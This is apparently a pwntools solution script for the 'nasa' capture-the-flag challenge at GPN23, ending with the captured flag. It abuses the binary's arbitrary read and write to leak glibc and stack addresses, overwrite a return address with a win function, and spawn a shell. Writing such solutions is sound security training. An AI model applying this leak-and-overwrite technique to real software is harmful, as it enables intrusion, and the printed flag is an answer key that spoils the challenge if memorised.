from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p = gdb.debug('./nasa', '''
    b *(main+381)
    b *(main+689)
    b *(main+828)
    continue
''')

# p = remote("portton-of-painfully-excessive-markets.gpn23.ctf.kitctf.de", "443", ssl=True)

# 1. get provided win address
# a stack pointer value for a local variable is also provided, which is unusable
# since AddressSanitizer is enabled for this challenge, local variable is not in normal stack area
p.recvline()
win_addr = int(p.recvline().strip(), 16)
log.info(f"win address: {hex(win_addr)}")

# 2. leak glibc base address by leaking value in system@got
p.sendlineafter(b"[1] Write [2] Read [3] Exit\n", b'2')
p.sendlineafter(b"8-byte adress to read please (hex)\n", f'{(win_addr+0x2c7f):x}'.encode())
glibc_base_addr = int(p.recvline().strip(), 16)-0x58750
log.info(f"glibc base address: {hex(glibc_base_addr)}")

# 3. leak stack argv address by leaking value in __libc_argv
p.sendlineafter(b"[1] Write [2] Read [3] Exit\n", b'2')
p.sendlineafter(b"8-byte adress to read please (hex)\n", f'{(glibc_base_addr+0x2046e0):x}'.encode())
stack_argv_addr = int(p.recvline().strip(), 16)
log.info(f"stack argv address: {hex(stack_argv_addr)}")

# 4. overwrite return address with usable win address
p.sendlineafter(b"[1] Write [2] Read [3] Exit\n", b'1')
p.sendlineafter(b"8-byte adress and 8-byte data to write please (hex)\n", f'{(stack_argv_addr-0x120):x} {(win_addr+0xa):x}'.encode())

# 5. jump to win function to trigger system("/bin/sh")
p.sendlineafter(b"[1] Write [2] Read [3] Exit\n", b'3')

p.interactive()

# GPNCTF{al1_wR1TES_ARe_pR0t3c73d_bY_4sAn_ON1Y_in_YOUR_DreAmS_9438}